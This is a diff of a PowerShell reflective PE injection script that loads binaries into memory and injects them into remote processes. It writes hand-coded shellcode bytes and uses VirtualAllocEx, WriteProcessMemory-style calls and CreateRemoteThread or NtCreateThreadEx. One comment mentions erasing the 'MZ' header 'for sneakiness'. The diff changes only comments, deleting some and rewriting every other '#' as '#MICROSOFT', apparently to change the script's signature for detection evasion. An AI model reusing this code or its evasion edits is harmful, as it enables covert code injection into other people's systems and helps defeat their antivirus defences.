@@ -66,7 +66,7 @@ $RemoteScriptBlock = {
 		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
 
 
-		#Enum MachineType
+		
 		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
 		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
 		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
@@ -75,14 +75,14 @@ $RemoteScriptBlock = {
 		$MachineType = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType
 
-		#Enum MagicType
+		
 		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
 		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
 		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
 		$MagicType = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType
 
-		#Enum SubSystemType
+		
 		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
 		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
 		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
@@ -98,7 +98,7 @@ $RemoteScriptBlock = {
 		$SubSystemType = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType
 
-		#Enum DllCharacteristicsType
+		
 		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
 		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
 		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
@@ -124,7 +124,7 @@ $RemoteScriptBlock = {
 		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY
 
-		#Struct IMAGE_FILE_HEADER
+		
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
 		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
@@ -137,7 +137,7 @@ $RemoteScriptBlock = {
 		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER
 
-		#Struct IMAGE_OPTIONAL_HEADER64
+		
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
 		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
@@ -188,7 +188,7 @@ $RemoteScriptBlock = {
 		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64
 
-		#Struct IMAGE_OPTIONAL_HEADER32
+		
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
 		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
@@ -240,7 +240,7 @@ $RemoteScriptBlock = {
 		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32
 
-		#Struct IMAGE_NT_HEADERS64
+		#MICROSOFTStruct IMAGE_NT_HEADERS64
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
 		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
@@ -249,7 +249,7 @@ $RemoteScriptBlock = {
 		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
 		
-		#Struct IMAGE_NT_HEADERS32
+		#MICROSOFTStruct IMAGE_NT_HEADERS32
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
 		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
@@ -258,7 +258,7 @@ $RemoteScriptBlock = {
 		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32
 
-		#Struct IMAGE_DOS_HEADER
+		#MICROSOFTStruct IMAGE_DOS_HEADER
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
 		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
@@ -294,7 +294,7 @@ $RemoteScriptBlock = {
 		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
 
-		#Struct IMAGE_SECTION_HEADER
+		#MICROSOFTMICROSOFTStruct IMAGE_SECTION_HEADER
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)
 
@@ -315,7 +315,7 @@ $RemoteScriptBlock = {
 		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER
 
-		#Struct IMAGE_BASE_RELOCATION
+		#MICROSOFTMICROSOFTStruct IMAGE_BASE_RELOCATION
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
 		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
@@ -323,7 +323,7 @@ $RemoteScriptBlock = {
 		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION
 
-		#Struct IMAGE_IMPORT_DESCRIPTOR
+		#MICROSOFTStruct IMAGE_IMPORT_DESCRIPTOR
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
 		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
@@ -334,7 +334,7 @@ $RemoteScriptBlock = {
 		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR
 
-		#Struct IMAGE_EXPORT_DIRECTORY
+		#MICROSOFTStruct IMAGE_EXPORT_DIRECTORY
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
 		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
@@ -351,7 +351,7 @@ $RemoteScriptBlock = {
 		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
 		
-		#Struct LUID
+		#MICROSOFTStruct LUID
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
 		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
@@ -359,7 +359,7 @@ $RemoteScriptBlock = {
 		$LUID = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
 		
-		#Struct LUID_AND_ATTRIBUTES
+		#MICROSOFTStruct LUID_AND_ATTRIBUTES
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
 		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
@@ -367,7 +367,7 @@ $RemoteScriptBlock = {
 		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
 		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
 		
-		#Struct TOKEN_PRIVILEGES
+		#MICROSOFTStruct TOKEN_PRIVILEGES
 		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
 		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
 		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
@@ -534,7 +534,7 @@ $RemoteScriptBlock = {
         $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
 		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
 		
-        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
+        #MICROSOFT NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
         if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
 		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
             $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
@@ -559,15 +559,15 @@ $RemoteScriptBlock = {
 
 		return $Win32Functions
 	}
-	#####################################
+	#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
 
 			
-	#####################################
-	###########    HELPERS   ############
-	#####################################
+	#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+	#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT    HELPERS   #MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
+	#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT#MICROSOFT
 
-	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
-	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
+	#MICROSOFTPowershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
+	#MICROSOFTThis will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
 	Function Sub-SignedIntAsUnsigned
 	{
 		Param(
@@ -590,7 +590,7 @@ $RemoteScriptBlock = {
 			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
 			{
 				$Val = $Value1Bytes[$i] - $CarryOver
-				#Sub bytes
+				#MICROSOFTSub bytes
 				if ($Val -lt $Value2Bytes[$i])
 				{
 					$Val += 256
@@ -637,7 +637,7 @@ $RemoteScriptBlock = {
 			$CarryOver = 0
 			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
 			{
-				#Add bytes
+				#MICROSOFTAdd bytes
 				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver
 
 				$FinalBytes[$i] = $Sum -band 0x00FF
@@ -811,19 +811,19 @@ $RemoteScriptBlock = {
 	        $Procedure
 	    )
 
-	    # Get a reference to System.dll in the GAC
+	    #MICROSOFT Get a reference to System.dll in the GAC
 	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
 	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
 	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
-	    # Get a reference to the GetModuleHandle and GetProcAddress methods
+	    #MICROSOFT Get a reference to the GetModuleHandle and GetProcAddress methods
 	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
 	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
-	    # Get a handle to the module specified
+	    #MICROSOFT Get a handle to the module specified
 	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
 	    $tmpPtr = New-Object IntPtr
 	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
 
-	    # Return the address of the function
+	    #MICROSOFT Return the address of the function
 	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
 	}
 	
@@ -891,10 +891,10 @@ $RemoteScriptBlock = {
 		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)
 
 		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
-		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
+		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #MICROSOFTNeed this to get success value or failure value
 		if (($Result -eq $false) -or ($ErrorCode -ne 0))
 		{
-			#Throw "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #todo need to detect if already set
+			#MICROSOFTThrow "Unable to call AdjustTokenPrivileges. Return value: $Result, Errorcode: $ErrorCode"   #MICROSOFTtodo need to detect if already set
 		}
 		
 		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
@@ -924,7 +924,7 @@ $RemoteScriptBlock = {
 		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero
 		
 		$OSVersion = [Environment]::OSVersion.Version
-		#Vista and Win7
+		#MICROSOFTVista and Win7
 		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
 		{
 			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
@@ -935,7 +935,7 @@ $RemoteScriptBlock = {
 				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
 			}
 		}
-		#XP/Win8
+		#MICROSOFTXP/Win8
 		else
 		{
 			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
@@ -966,15 +966,15 @@ $RemoteScriptBlock = {
 		
 		$NtHeadersInfo = New-Object System.Object
 		
-		#Normally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
+		#MICROSOFTNormally would validate DOSHeader here, but we did it before this function was called and then destroyed 'MZ' for sneakiness
 		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)
 
-		#Get IMAGE_NT_HEADERS
+		#MICROSOFTGet IMAGE_NT_HEADERS
 		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
 		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
 		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)
 		
-		#Make sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
+		#MICROSOFTMake sure the IMAGE_NT_HEADERS checks out. If it doesn't, the data structure is invalid. This should never happen.
 	    if ($imageNtHeaders64.Signature -ne 0x00004550)
 	    {
 	        throw "Invalid IMAGE_NT_HEADER signature."
@@ -996,7 +996,7 @@ $RemoteScriptBlock = {
 	}
 
 
-	#This function will get the information needed to allocated space in memory for the PE
+	#MICROSOFTThis function will get the information needed to allocated space in memory for the PE
 	Function Get-PEBasicInfo
 	{
 		Param(
@@ -1011,29 +1011,29 @@ $RemoteScriptBlock = {
 		
 		$PEInfo = New-Object System.Object
 		
-		#Write the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
+		#MICROSOFTWrite the PE to memory temporarily so I can get information from it. This is not it's final resting spot.
 		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
 		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null
 		
-		#Get NtHeadersInfo
+		#MICROSOFTGet NtHeadersInfo
 		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types
 		
-		#Build a structure with the information which will be needed for allocating memory and writing the PE to memory
+		#MICROSOFTBuild a structure with the information which will be needed for allocating memory and writing the PE to memory
 		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
 		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
 		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
 		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
 		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
 		
-		#Free the memory allocated above, this isn't where we allocate the PE to memory
+		#MICROSOFTFree the memory allocated above, this isn't where we allocate the PE to memory
 		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
 		
 		return $PEInfo
 	}
 
 
-	#PEInfo must contain the following NoteProperties:
-	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
+	#MICROSOFTPEInfo must contain the following NoteProperties:
+	#MICROSOFT	PEHandle: An IntPtr to the address the PE is loaded to in memory
 	Function Get-PEDetailedInfo
 	{
 		Param(
@@ -1057,10 +1057,10 @@ $RemoteScriptBlock = {
 		
 		$PEInfo = New-Object System.Object
 		
-		#Get NtHeaders information
+		#MICROSOFTGet NtHeaders information
 		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
 		
-		#Build the PEInfo object
+		#MICROSOFTBuild the PEInfo object
 		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
 		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
 		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
@@ -1130,14 +1130,14 @@ $RemoteScriptBlock = {
 		}
 		
 		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
-		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
+		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #MICROSOFTKernel32 loaded to the same address for all processes
 		
 		[IntPtr]$DllAddress = [IntPtr]::Zero
-		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
-		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
+		#MICROSOFTFor 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
+		#MICROSOFT	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
 		if ($PEInfo.PE64Bit -eq $true)
 		{
-			#Allocate memory for the address returned by LoadLibraryA
+			#MICROSOFTAllocate memory for the address returned by LoadLibraryA
 			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
 			{
@@ -1145,7 +1145,7 @@ $RemoteScriptBlock = {
 			}
 			
 			
-			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
+			#MICROSOFTWrite Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
 			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
 			$LoadLibrarySC2 = @(0x48, 0xba)
 			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
@@ -1190,7 +1190,7 @@ $RemoteScriptBlock = {
 				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 			}
 			
-			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
+			#MICROSOFTThe shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
 			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
 			if ($Result -eq $false)
@@ -1246,7 +1246,7 @@ $RemoteScriptBlock = {
 		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
 		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
 		
-		#Write FunctionName to memory (will be used in GetProcAddress)
+		#MICROSOFTWrite FunctionName to memory (will be used in GetProcAddress)
 		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
 		$RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		if ($RFuncNamePtr -eq [IntPtr]::Zero)
@@ -1266,12 +1266,12 @@ $RemoteScriptBlock = {
 			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
 		}
 		
-		#Get address of GetProcAddress
+		#MICROSOFTGet address of GetProcAddress
 		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
-		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes
+		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #MICROSOFTKernel32 loaded to the same address for all processes
 
 		
-		#Allocate memory for the address returned by GetProcAddress
+		#MICROSOFTAllocate memory for the address returned by GetProcAddress
 		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
 		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
 		{
@@ -1279,9 +1279,9 @@ $RemoteScriptBlock = {
 		}
 		
 		
-		#Write Shellcode to the remote process which will call GetProcAddress
-		#Shellcode: GetProcAddress.asm
-		#todo: need to have detection for when to get by ordinal
+		#MICROSOFTWrite Shellcode to the remote process which will call GetProcAddress
+		#MICROSOFTShellcode: GetProcAddress.asm
+		#MICROSOFTtodo: need to have detection for when to get by ordinal
 		[Byte[]]$GetProcAddressSC = @()
 		if ($PEInfo.PE64Bit -eq $true)
 		{
@@ -1341,7 +1341,7 @@ $RemoteScriptBlock = {
 			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
 		}
 		
-		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
+		#MICROSOFTThe process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
 		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
 		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
 		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
@@ -1383,13 +1383,13 @@ $RemoteScriptBlock = {
 			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
 			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
 		
-			#Address to copy the section to
+			#MICROSOFTAddress to copy the section to
 			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
 			
-			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
-			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
-			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
-			#    so truncate SizeOfRawData to VirtualSize
+			#MICROSOFTSizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
+			#MICROSOFT    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
+			#MICROSOFT    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
+			#MICROSOFT    so truncate SizeOfRawData to VirtualSize
 			$SizeOfRawData = $SectionHeader.SizeOfRawData
 
 			if ($SectionHeader.PointerToRawData -eq 0)
@@ -1408,7 +1408,7 @@ $RemoteScriptBlock = {
